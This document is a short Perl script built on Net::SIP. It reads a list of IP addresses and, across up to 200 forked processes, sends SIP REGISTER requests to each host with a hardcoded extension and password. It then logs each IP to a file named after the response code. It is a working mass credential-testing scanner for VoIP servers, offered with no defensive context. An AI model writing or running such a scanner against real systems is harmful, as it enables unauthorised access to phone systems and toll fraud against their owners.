#/usr/bin/perl
use Net::SIP;
my $ipfile = $ARGV[0];
my $user = "100";
my $pass = "inj3ctor3";
my $max_processes = "200";
mkdir("logs");
open( IPS,  "<$ipfile") || die " Cannot open the  word file : $ipfile ! \n"                                                                                                             ;
        chomp(@iplist = <IPS>);
close(IPS);
foreach $x (@iplist)
        {
#my ($ip,$remote_port) = split (/ /, $x, 2);
        my $pid;
        $pid=fork();
        if($pid>0){
                $npids++;
                #print " Processes are: $npids\n" ;
                if($npids>=$max_processes){
                        for(1..($max_processes)){
                                my $wait_ret=wait();
                                if($wait_ret>0){
                                        $npids--;
                                }
                        }
                }
                next;
        }elsif(undef $pid){
                print " Fork error!\n";
                exit(0);
        }else{
                local $SIG{'ALRM'} = sub { exit(0); };
                alarm 0;

        eval {
my $ip = $x;
              my $ua = Net::SIP::Simple->new(
  outgoing_proxy => $ip,
  registrar => $ip,
  domain => $ip,
  from => $user,
  auth => [ $user,$pass ],
);

# Register agent
alarm("2");
$ua->register( expires => 1800 ); # <- Valeur mini chez free

my $err = $ua->error;
my ($w1,$w2,$w3,$code) = split(" ", $err);
print "$ip $code\n";
my $save = "logs/$code.txt";
open(my $fh, '>>', $save);
print $fh "$ip\n";
close $fh;

        };


                exit(0);
        }
}

for(1..$npids){
        my $wt=wait();
        if($wt==-1){
                print " is  $!\n";
                redo;
        }
}


